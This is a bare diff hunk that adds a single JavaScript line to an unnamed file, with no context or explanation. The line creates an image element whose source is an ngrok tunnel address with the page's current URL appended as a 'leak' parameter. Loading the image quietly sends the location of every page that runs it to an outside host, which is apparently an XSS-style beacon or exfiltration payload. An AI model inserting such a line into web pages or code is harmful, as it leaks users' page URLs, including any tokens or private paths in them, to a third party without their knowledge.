@@ -1,0 +1,1 @@
+var i = document.createElement("img"); i.src = "http://0d3d3470.ngrok.io?leak="+encodeURIComponent(document.location);
